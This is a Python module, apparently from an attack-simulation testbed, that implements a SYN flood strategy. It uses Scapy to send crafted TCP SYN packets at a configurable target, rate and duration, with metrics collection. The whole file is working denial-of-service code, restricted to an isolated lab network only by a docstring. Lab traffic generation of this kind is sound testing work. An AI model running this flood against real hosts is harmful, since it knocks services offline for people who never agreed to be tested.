"""SYN flood strategy (optional, requires raw socket / root).

Uses Scapy to craft TCP SYN packets at the target. Only safe when the worker
runs inside the isolated attack-net (Track D), because the kernel won't
complete the handshake. Falls back to gracefully reporting errors if raw
sockets are unavailable (e.g. when developing locally without root).
"""
from __future__ import annotations

import asyncio
import logging
import random
import time
from typing import Any, Dict
from urllib.parse import urlparse

from .metrics import MetricsCollector

log = logging.getLogger("attacker.syn_flood")


def _parse_target(url: str) -> tuple[str, int]:
    p = urlparse(url if "://" in url else f"http://{url}")
    host = p.hostname or "127.0.0.1"
    port = p.port or (443 if p.scheme == "https" else 80)
    return host, port


async def run(playbook: Dict[str, Any], metrics: MetricsCollector) -> None:
    params = playbook.get("parameters", {})
    target_url: str = params.get("targetUrl", "http://defender:8080")
    rps = int(params.get("requestsPerSecond") or 200)
    duration = int(params.get("durationSec", 15))
    host, port = _parse_target(target_url)

    log.info("syn_flood start %s:%d rps=%d duration=%ds", host, port, rps, duration)

    # Import lazily — Scapy raw socket setup can fail outside containers
    try:
        from scapy.all import IP, TCP, send  # type: ignore
    except Exception as exc:  # noqa: BLE001
        log.error("syn_flood scapy unavailable: %s", exc)
        for _ in range(10):
            metrics.record(error=True)
        return

    deadline = time.time() + duration

    def _blast_batch(n: int) -> None:
        try:
            for _ in range(n):
                sport = random.randint(1024, 65535)
                seq = random.randint(0, 2**32 - 1)
                pkt = IP(dst=host) / TCP(sport=sport, dport=port, flags="S", seq=seq)
                try:
                    send(pkt, verbose=False)
                    metrics.record(success=True)
                except Exception:  # noqa: BLE001 — raw socket may be denied
                    metrics.record(error=True)
        except Exception:  # noqa: BLE001
            metrics.record(error=True)

    while time.time() < deadline:
        tick = time.time()
        await asyncio.get_event_loop().run_in_executor(None, _blast_batch, rps)
        elapsed = time.time() - tick
        if elapsed < 1.0:
            await asyncio.sleep(1.0 - elapsed)

    log.info("syn_flood done total=%d ok=%d err=%d", metrics.total, metrics.successful, metrics.errors)
